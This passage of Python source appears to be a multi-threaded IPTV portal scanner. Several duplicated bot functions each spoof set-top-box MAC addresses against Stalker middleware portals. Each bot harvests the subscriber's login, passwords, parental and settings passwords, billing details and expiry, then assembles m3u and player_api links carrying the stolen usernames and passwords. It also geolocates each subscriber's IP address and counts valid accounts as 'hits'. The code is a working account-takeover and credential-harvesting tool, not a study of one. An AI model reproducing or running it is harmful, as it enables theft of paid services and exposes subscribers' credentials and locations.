                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d3():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(3, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_03"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d4():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(4, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_04"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
                    #     country_name = country_name.split('"')[0]
                    # except:
                    #     pass
                    livelist = ""
                    vodlist = ""
                    serieslist = ""

                    try:
                        url10 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_live_streams"
                        try:
                            res = option.get(url10, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofchannels = str(data.count("stream_id"))

                        url11 = "http://" + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_vod_streams"
                        try:
                            res = option.get(url11, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofmovies = str(data.count("stream_id"))

                        url12 = http + panel + "/player_api.php?username=" + user + "&password=" + pas + "&action=get_series"
                        try:
                            res = option.get(url12, timeout=15, verify=False)
                        except OSError as err:
                            print("OS error:", err)
                        except Exception as err:
                            print(f"Unexpected {err}, {type(err)}")
                            raise
                        data = str(res.text)
                        numberofseries = str(data.count("series_id"))
                    except:
                        pass
                    # vpn = ""
                    # if not ip == "":
                    #     vpn = vpnip(ip)
                    # else:
                    #     vpn = " No IP Address"

                    if channelcat == "1" or channelcat == "2":
                        listlink = liveurl
                        livel = ' «★» '
                        livelist = list(listlink, macs, token, livel)
                    if channelcat == "2":
                        listlink = vodurl
                        livel = ' «★» '
                        vodlist = list(listlink, macs, token, livel)
                        listlink = seriesurl
                        livel = ' «★️» '
                        serieslist = list(listlink, macs, token, livel)
                    hit(mac, trh, real, m3ulink, m3uhost, m3ustat, state, vpn, livelist, vodlist, serieslist, playerapi,
                        fname, tariff_plan, ls, login, password, tariff_plan_id, bill, expire_billing_date, max_online,
                        parent_password, stb_type, comment, country, settings_password, country_name, scountry,
                        numberofchannels, numberofmovies, numberofseries)


def d5():
    global hitc, numberofchannels, numberofmovies, numberofseries
    global hitr, macv, tokenr, m3ustat
    global bots, m3uvpn, m3uon, macon, macvpn
    global expired_hits_bypassed
    for mac in range(5, mactrys, numbots):
        login = ""
        parent_password = ""
        password = ""
        stb_type = ""
        tariff_plan_id = ""
        comment = ""
        country = ""
        settings_password = ""
        expire_billing_date = ""
        max_online = ""
        expires = ""
        ls = ""
        fname = ""
        tariff_plan = ""
        bill = ""
        numberofchannels = "0"
        numberofmovies = "0"
        numberofseries = "0"
        livelist = ""
        vodlist = ""
        serieslist = ""
        playerapi = ""
        state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"
        vpn = ""
        country_name = ""
        scountry = ""
        m3ulink = ""
        m3uhost = ""
        user = ""
        pas = ""
        plink = ""
        real = ""
        total = mac
        if selectcombo == "0":
            mac = randommac()
        else:
            macv = re.search(pattern, totLen[mac], re.IGNORECASE)  # check for matching mac in data
            if macv:
                mac = macv.group()
                mac = mac.upper()
            else:
                continue
        macs = mac.upper().replace(':', '%3A')
        bot = "Bot_05"
        oran = ""
        oran = round((total / mactrys * 100), 2)
        trys = 0
        data = ""
        while True:
            try:
                res = option.get(url1, headers=hea1(macs), timeout=15, verify=False)  # get to
                data = str(res.text)  # retrieve token stored in data
                break
            except:
                trys = trys + 1
                time.sleep(1)  # just some waiting around if they are problems receiving data
                if trys == 12:
                    break
        echok(mac, bot, total, hitr, hitc, status_code, oran, load, panel, tokenr)  # send data outside thread
        tokenr = "\33[35m"  # turn mac code purple if no token in response
        if 'token' in data:
            tokenr = "\33[0m"  # mac code white if token is in response
            token = data.replace('{"js":{"token":"', "")
            token = token.split('"')[0]  # separating token data out of the rest of the response
            trys = 0
            while True:
                try:
                    res = option.get(url2, headers=hea2(macs, token), timeout=15, verify=False)
                    data = ""
                    data = str(res.text)
                    break
                except:
                    trys = trys + 1
                    time.sleep(1)
                    if trys == 12:
                        break
            id = "null"
            ip = ""
            country = ""

            try:
                id = data.split('{"js":{"id":')[1]
                id = id.split(',"name')[0]
                ip = data.split('ip":"')[1]
                ip = ip.split('"')[0]
            except:
                pass
            try:
                ip = str(fix_me2(data, "ip"))
            except:
                pass
            try:
                expires = str(fix_me2(data, "expires"))
            except:
                pass
            if id == "null" and expires == "" and ban == "":
                continue

            try:
                if load == "stalker_portal/server/load.php":
                    if 'login":"' in data:
                        login = str(fix_me2(data, "login"))
                        parent_password = str(fix_me2(data, "parent_password"))
                        password = str(fix_me2(data, "password"))
                        stb_type = str(fix_me2(data, "stb_type"))
                        tariff_plan_id = str(fix_me2(data, "tariff_plan_id"))
                        comment = str(fix_me2(data, "comment"))
                        country = str(fix_me2(data, "country"))
                        settings_password = str(fix_me2(data, "settings_password"))
                        expire_billing_date = str(fix_me2(data, "expire_billing_date"))
                        ls = str(fix_me2(data, "ls"))
                        try:
                            max_online = str(fix_me2(data, "max_online"))
                        except:
                            max_online = ""
            except:
                pass
            if not id == "null":
                trys = 0
                while True:
                    try:
                        res = option.get(url3, headers=hea2(macs, token), timeout=15, verify=False)
                        data = ""
                        data = str(res.text)
                        break
                    except:
                        trys = trys + 1
                        time.sleep(1)
                        if trys == 12:
                            break
                if not data.count('phone') == 0:
                    hitr = "\33[1;36m"
                    hitc = hitc + 1
                    trh = ""
                    fname = ""
                    ls = ""
                    tariff_plan = ""
                    bill = ""
                    if load == "stalker_portal/server/load.php":
                        try:
                            fname = str(fix_me2(data, "fname"))
                        except:
                            pass
                        try:
                            tariff_plan = str(fix_me2(data, "tariff_plan"))
                        except:
                            pass
                        try:
                            bill = str(fix_me2(data, "created"))
                        except:
                            pass
                    if "phone" in data:
                        trh = str(fix_me2(data, "phone"))
                    if 'end_date' in data:
                        trh = data.split('end_date":"')[1]
                        trh = trh.split('"')[0]
                    else:
                        try:
                            trh = data.split('phone":"')[1]
                            trh = trh.split('"')[0]

                            if trh.lower()[:2] == 'un':
                                remainingdays = "∞ Days"
                                trh = trh + ' ' + remainingdays
                            else:
                                days_left = days_clear(trh)
                                if days_left is None or days_left <= 0:
                                    expired_hits_bypassed += 1
                                    print(f"\n\033[91mExpired Hit Passed: MAC {mac} - Expiry: {trh}\033[0m")
                                    hitc = hitc - 1 if hitc > 0 else 0
                                    hitr = "\33[1;33m"
                                    continue

                                remainingdays = str(days_left) + " Days"
                                trh = trh + ' ' + remainingdays
                        except Exception as e:
                            print(f"\033[93mDate Processing Error: {e}\033[0m")
                            continue

                    hitprint(mac, trh)
                    trys = 0
                    while True:
                        try:
                            res = option.get(url6, headers=hea2(macs, token), timeout=10, verify=False)
                            data = ""
                            data = str(res.text)
                            cid = ""
                            cid = (str(res.text).split('ch_id":"')[5].split('"')[0])
                            # print(cid)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 10:
                                # quit()
                                cid = "94067"
                                break
                    real = panel
                    m3ulink = ""
                    m3uhost = ""
                    user = ""
                    pas = ""
                    plink = ""  # Initialize plink here
                    state = " 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐎𝐩𝐩𝐬"

                    trys = 0
                    while True:
                        try:
                            res = option.get(url(cid), headers=hea2(macs, token), timeout=15, verify=False)
                            data = ""
                            data = str(res.text)
                            link = data.split('ffmpeg ')[1].split('"')[0].replace(r'\/', '/')
                            user = login
                            real = '' + link.split('://')[1].split('/')[0] + '/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace('/c/',
                                                                                      '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus"
                            m3uhost = "http://" + panel.replace('http://', '').replace('/c/',
                                                                                       '') + "/get.php?username=" + str(
                                user) + "&password=" + str(pas) + "&type=m3u_plus&output=m3u8"
                            state = image(link)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(1)
                            if trys == 12:
                                break

                    playerapi = ""
                    if not m3ulink == "":
                        try:
                            playerlink = (http + real.replace(http, '').replace('/c/',
                                                                                '') + "/player_api.php?username=" + user + "&password=" + pas)
                            plink = real.replace(http, '').replace('/c/', '')  # Define plink here
                            playerapi = m3uapi(playerlink, mac, token)
                            m3ustat = m3ustatus(cid, user, pas, plink)
                        except:
                            pass

                        if playerapi == "":
                            try:
                                playerlink = (http + panel.replace(http, '').replace('/c/',
                                                                                     '') + "/player_api.php?username=" + user + "&password=" + pas)
                                plink = panel.replace(http, '').replace('/c/', '')  # Update plink here
                                playerapi = m3uapi(playerlink, mac, token)
                            except:
                                pass

                    try:
                        m3ustat = m3ustatus(cid, user, pas, plink)
                    except:
                        m3ustat = "Error"
                    if m3ustat == "ⓃⓄ ⒾⓂ︎ⒶⒼⒺ ":
                        m3uvpn = m3uvpn + 1
                    else:
                        m3uon = m3uon + 1
                    if state == "ⓊⓈⒺ ⓋⓅⓃ 🔒 " or state == "Invalid Opps":
                        macvpn = macvpn + 1
                    else:
                        macon = macon + 1
                    SN = (hashlib.md5(mac.encode('utf-8')).hexdigest())
                    SNENC = SN.upper()
                    SNCUT = SNENC[:13]
                    DEV = hashlib.sha256(mac.encode('utf-8')).hexdigest()
                    DEVENC = DEV.upper()
                    SG = SNCUT + '+' + mac
                    SING = (hashlib.sha256(SG.encode('utf-8')).hexdigest())
                    SINGENC = SING.upper()
                    if not ip == "":
                        vpn = vpnip(ip)
                    else:
                        vpn = "ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ"
                    url5 = "https://ipapi.co/" + ip + "/json/"
                    while True:
                        try:
                            res = option.get(url5, timeout=7, verify=False)
                            break
                        except:
                            trys = trys + 1
                            time.sleep(2)
                            if trys == 4:
                                break
                    try:
                        trys = 0
                        data1 = str(res.text)
                        scountry = ""
                        country_name = "Unavailable 🏴‍☠️"
                        scountry = data1.split('country_code": "')[1]
                        scountry = scountry.split('"')[0]
                        country_name = data1.split('country_name": "')[1]
                        country_name = country_name.split('"')[0]
                        flagc = flag.flag(scountry)
                        if country_name == "":
                            country_name = "Unavailable 🏴‍☠️"
                        else:
                            country_name = country_name + " " + flagc
                        country_name = country_name
                    except:
                        pass

                    # try:
                    #     trys = 0
                    #     data = str(res.text)
                    #     scountry = ""
                    #     country_name = ""
                    #     scountry = data.split('country_code": "')[1]
                    #     scountry = scountry.split('"')[0]
                    #     country_name = data.split('country_name": "')[1]
